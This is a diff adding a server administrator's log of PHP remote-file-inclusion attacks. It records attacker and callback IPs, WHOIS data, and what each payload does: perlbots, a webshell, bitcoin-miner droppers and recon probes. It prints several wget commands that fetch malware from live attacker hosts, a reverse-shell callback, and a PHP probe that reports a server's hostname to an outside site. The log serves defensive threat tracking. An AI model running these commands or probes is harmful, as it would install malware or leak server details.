@@ -1,0 +1,313 @@
+#PHP-RFI Attacks
+#This is a collection of PHP RFI attackers I've seen on a variety of servers I'm responsible for securing.
+#Essentially, these servers were seen attempting to exploit CVE 2012-1823, 2311, 2335 and 2336.
+# Apparently a lot of botnets spread via this vulnerability combined with RFI attacks.
+# This file has the following format:
+#Pitcher: Who threw the exploit
+#Catcher: Who is the exploiter telling the target server to call back to for a payload
+#NSlookup (pitcher/catcher): Domain name/data for Pitchers and Catchers
+#WHOIS (pitcher/catcher): collects a bunch of whois data for pitchers and catchers -- route, org name, country, abuse contacts, AS number... if they were available.
+#Payload: payload seen in PHP code attackers tried to RFI/prepend to the server
+#Description: what does the payload do?
+#Server: any servers the payload is seen calling back to
+#Port: port the payload calls back to
+#Channel: for IRC bots, what channel does it connect to?
+#NSlookup: domain info for the payload IP address
+#WHOIS: whois data for the payload IP address
+#Notes: misc notes.
+
+Pitcher: 96.8.126.97
+Catcher: 108.61.91.211
+Nslookup (pitcher): s1-dallas.cloudhostservers.com.
+WHOIS (pitcher):
+96.8.126.0 - 96.8.126.255
+ColoCrossing/CLDR.eu
+NSlookup (catcher): pvtinsiderdl.com.
+WHOIS (catcher):
+108.61.0.0 - 108.61.255.255
+GRABWEB hosting/Choopa LLC
+Payload: wget http://108.61.91.211/pd.pdf
+Description: perlbot
+Server: 217.174.250.46
+Port: 80
+Channel: #113
+NSlookup: server217-174-250-46.live-servers.net
+WHOIS:
+217.174.240.0/20
+Fasthosts Internet Limited
+UK
+abuse@fasthosts.co.uk
+AS15418
+Notes:
+
+Pitcher: 187.108.192.62
+Catcher: 200.98.224.16
+NSlookup (pitcher): linux.nrserver23.net
+WHOIS (pitcher):
+187.108.192/20
+SNH Servi�os de Internet Ltda.
+BR
+security@eveo.com.br
+AS53107
+NSlookup (catcher): loja.fastherba.com.br
+WHOIS (catcher):
+200.98.0.0/16
+Universo Online S.A.
+BR
+security@uol.com.br
+cert@cert.br
+mail-abuse@cert.br
+AS15201
+Payload: wget http://loja.fastherba.com.br/lol/lista/pica/r.txt
+Description: R57 webshell (related to C99, etc.)
+Server:
+Port:
+Channel:
+NSlookup:
+WHOIS:
+Notes:
+
+Pitcher: 91.209.192.252
+Catcher: 91.209.192.252
+NSlookup (pitcher): xenmaster34.drecomm.nl.
+WHOIS (pitcher):
+91.209.192.0/24
+Drecomm BV
+NL
+systeembeheer@drecomm.nl
+AS8312
+NSlookup (catcher):
+WHOIS (catcher):
+Payload:wget http://94.102.63.238/robotel.txt
+Description: perlbot
+Server: 94.102.63.238
+Port: 443
+Channel: #php,#work 
+NSlookup:
+WHOIS:
+Notes: pitcher, catcher, perlbot server are all the same
+
+Pitcher: 75.98.84.57
+Catcher: 208.85.177.238
+Nslookup (pitcher): NX
+WHOIS (pitcher):
+75.98.84.48 - 75.98.84.63
+Internap Network Services/Eleven Inc.
+NSlookup (catcher): 208-85-177-238.peakinter.net
+WHOIS (catcher):
+208.85.176.0/21
+PEAKINTERNET
+US
+noc@peakinter.net
+Payload: wget 208.85.177.238/speedtest/.a/hb/php04
+Description: Perlbot
+Server: 194.24.228.203
+Port: 443
+Channel: #allornothing
+NSlookup: 194-24-228-203.thya.net.
+WHOIS:
+194.24.228.0/23
+L'ile aux surfers s.a.r.l.
+FR
+abuse@ripe.net
+AS41044
+Notes:
+- Informed peak they were serving malware ~ 1 week ago...
+
+Pitcher: 77.92.76.182
+Catcher: 77.92.76.182
+NSlookup (pitcher): NX
+WHOIS (pitcher):
+77.92.64.0/19
+UK2 Infrastructure
+GB
+urgent@submitabuse.com
+AS13213
+Payload: wget http://77.92.76.182/ls
+Description: perlbot
+Server: 217.174.250.46
+Port: 80
+Channel:#113
+NSlookup: server217-174-250-46.live-servers.net
+WHOIS:
+217.174.240.0/20
+FASTHOSTS-UK-DS-NETWORK
+GB
+abuse@fasthosts.co.uk
+AS15418
+Notes:
+-Seen other servers serving similar payload. Connects to same channel.
+-Very Busy: 227 hits seen this weekend (1600 Fri - 800 Mon)
+
+Pitcher: 80.82.78.12
+Catcher: 80.82.78.12
+NSlookup (pitcher): b19s12.anonib.com
+WHOIS:
+80.82.78.0/24
+NL-ECATEL-20100816
+Ecatel LTD
+NL
+AS29073
+Payload: http://80.82.78.12/wut, Reverse shell to 80.82.78.12:31337
+Description: perlbot
+Server: 173.208.146.46
+Port: 6667
+Channel: #pbot
+NSlookup: NX
+WHOIS:
+173.208.128.0/17
+WholeSale Internet, Inc.
+US
+abuse@wholesaleinternet.net
+admin@wholesaleinternet.net
+aaron@wholesaleinternet.com
+AS32097
+Notes:
+-Not the first time we've seen this payload, either.
+-Sans ISC reported on this. Wonder if they troll my malware feed :D
+
+Pitcher: 89.136.120.205
+Catcher: www.astraltor.de
+NSlookup (Pitcher): NX
+WHOIS (Pitcher):
+89.136.0.0/16
+UPCRO
+RO
+abuse-mailbox:  abuse@upc.ro
+origin:         AS6830
+NSlookup (Catcher): 85.214.150.6
+WHOIS (Catcher):
+85.214.150.0/24
+Strato AG
+DE
+abuse@strato.de
+AS6724
+Payload: wget http://www.astraltor.de/php, wget http://www.astraltor.de/a
+Description: php is a perlbot, while a is a shell script that pulls down php as well as BTC miner binaries. Overall goal appears to be mining of bitcoin.
+Server: 80.240.137.183
+Port: 3303
+Channel: #work
+NSlookup: server.oakleyharrod.com
+WHOIS: 
+80.240.128.0 - 80.240.143.255
+Digital Ocean, Inc.
+NL
+abuse@digitalocean.com
+Notes:
+-not the first time I've seen astraltor.de as a catcher
+-not the first time seeing these payloads.
+-first time seeing this pitcher, though.
+
+pitcher: 120.37.236.161
+catcher: api.alihack.com
+NSlookup (pitcher): 161.236.37.120.broad.pt.fj.dynamic.163data.com.cn
+WHOIS (pitcher):
+120.32.0.0 - 120.39.255.255
+CHINANET FUJIAN PROVINCE NETWORK
+CN
+abuse@fjdcb.fz.fj.cn
+anti-spam@ns.chinanet.cn.net
+NSlookup (catcher): api.alihack.com -> ixyou.x.incapdns.net -> 192.230.66.78
+WHOIS (catcher):
+192.230.64.0/18
+Incapsula Inc
+US
+abuse@incapsula.com
+ip@incapsula.com
+tomer@incapsula.com
+AS19551
+Payload: wget api.alihack.com/info.txt
+Description: very small payload, posts to alihack.com. It's recon to ascertain PHP RFI vulnerability.
+Notes: 
+-121.205.200.35
+-68.64.172.226
+-59.58.159.25
+-142.54.184.243
+-121.205.200.35
+-23.95.34.227 
+- The IP addresses listed above are also throwing this same payload, this payload seems to be targeted towards the energy sector.
+
+Pitcher: 188.190.98.18
+Catcher: wp-blogstats.com
+NSlookup (pitcher): hosted-in.infiumhost.com
+WHOIS (pitcher):
+188.190.98.0/24
+Infium LLC
+UA
+abusemail@infiumhost.com
+AS197145
+NSlookup (catcher): 91.194.254.79
+WHOIS (catcher):
+91.194.254.0/23
+Dimline Ltd.
+AT
+abuse@dimline.org
+AS43449
+Payload: <?php echo "Content-type: text/html";  @ignore_user_abort(true); file_get_contents('http://wp-blogstats.com/rf/s_v2.php?d='.$_SERVER['HTTP_HOST']); exit(0); ?>
+Description: Not unlike alihack, this is a "touch" to see if a server is vulnerable to RFI attacks.
+Notes:
+-Also not unlike alihack, has a fixation towards the energy sector.
+
+8/22
+
+Pitcher: 84.200.75.194
+Catcher: 84.200.75.194
+NSlookup (pitcher): 194.75.200.84.in-addr.arpa -> dedicated-server-anbieter.com.
+WHOIS (pitcher):
+84.200.0.0/16
+Accelerated IT Services GmbH
+DE
+abuse@accelerated.de
+AS31400
+NSlookup (catcher):
+WHOIS (catcher):
+Payload: wget http://84.200.75.194/pds
+Description: perlbot
+Server: 50.56.238.185
+Port: 80
+Channel: #113
+NSlookup: 50-56-238-185.static.cloud-ips.com.
+WHOIS:
+Rackspace Cloud Servers RACKS-8-1350332940593978 (NET-50-56-236-0-1) 50.56.236.0 - 50.56.239.255
+Rackspace Hosting RACKS-8-NET-4 (NET-50-56-0-0-1) 50.56.0.0 - 50.57.255.255
+Notes:
+
+Pitcher: 107.167.11.226
+Catcher: 107.167.11.226
+NSlookup (pitcher): customer.sharktech.net
+WHOIS (pitcher):
+107.167.0.0 - 107.167.31.255
+Sharktech
+NSlookup (catcher):
+WHOIS (catcher):
+Payload: wget http://107.167.11.226/bot
+Description: perlbot
+Server: 50.56.238.185
+Port: 80
+Channel: #115, #my.info
+NSlookup: 50-56-238-185.static.cloud-ips.com.
+WHOIS:
+50.56.236.0 - 50.56.239.255
+Rackspace Cloud Hosting
+
+Pitcher: 190.7.129.141
+Catcher: www.kniha.sivok.sk
+Nslookup (pitcher): dinamic-cable-190-7-129-141.epm.net.co
+WHOIS (pitcher):
+190.7.128/20
+EPM Telecomunicaciones S.A. E.S.P.
+CO
+adminternet@UNE.NET.CO
+NSlookup (catcher): 82.119.224.198
+WHOIS (catcher):
+82.119.224.0/20
+WEBY GROUP, s.r.o.
+SK
+tech@webygroup.sk
+AS5578
+Payload: wget http://www.kniha.sivok.sk/letsex.php
+Description: N/A
+Notes: Payload seems to be based around clickfraud.
+
+
+
